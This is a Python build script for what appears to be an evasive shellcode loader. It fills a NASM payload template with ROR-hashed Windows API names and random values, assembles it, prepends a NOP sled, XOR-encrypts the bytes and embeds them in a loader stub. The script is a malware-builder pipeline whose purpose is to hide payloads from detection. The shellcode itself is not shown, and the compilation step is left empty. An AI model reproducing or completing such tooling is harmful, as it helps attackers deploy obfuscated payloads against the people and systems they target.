from configparser import ConfigParser
from scripts.ROR import hash
from scripts.utils import *
import random

config = ConfigParser()
config.read(".conf") 

ROR_VALUE = config.getint("Payload", "ror_value")
ENCRYPTION_KEY = config.get("Payload", "encryption_key")
PAYLOAD_FILE = config.get("Payload", "filename")
STUB_FILE = config.get("Loader", "filename")

WORKING_FOLDER = "temp/"

SHELLCODE_PREFIX = "909090"

def main():
    print("===========CONFIG==========")
    print(f"ROR value: {ROR_VALUE}")
    print(f"Encryption key: {ENCRYPTION_KEY}")
    print("===========================\n")

    print("===========PAYLOAD==============")
    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", f"byte {hex(ROR_VALUE)}")
    remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_FILE)

    # Tags like %HASH_MODULE_FUNCTION% are replaced by their hash
    for tag in remaining_tags:
        parts = tag.replace("%", "").split("_")
        if parts[0] == "HASH":
            sed_file(WORKING_FOLDER+PAYLOAD_FILE, tag, str(hex(hash(parts[1], parts[2], ROR_VALUE))))
        if parts[0] == "RANDOM":
            # Générer une valeur aléatoire de 32 bits
            dword_value = random.randint(0, 0xFFFFFFF)
            sed_file(WORKING_FOLDER+PAYLOAD_FILE, tag, str(hex(dword_value)))


    instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
    nb_bytes = int(len(instructions)/2)
    print(f"Shellcode length: {nb_bytes} bytes")
    print("================================\n")

    instructions = SHELLCODE_PREFIX+instructions
    # Encrypt the shellcode
    if ENCRYPTION_KEY != "":
        print("===========ENCRYPTION==============")
        print(instructions)
        print(f"\nEncrypted with '{ENCRYPTION_KEY}'\n")
        encrypted_instructions = xor_encrypt_decrypt(instructions, ENCRYPTION_KEY)
        print(encrypted_instructions)
        print("===================================\n")
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
        sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", ENCRYPTION_KEY)
    else:
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
        sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", "")

    # Need to decide if 909090 xor KEY is constant to unxor later, maybe no need to
    

    # Replace the final shellcode in the loader

    

    print("\n================COMPILATION===============")


if __name__ == "__main__":
    main()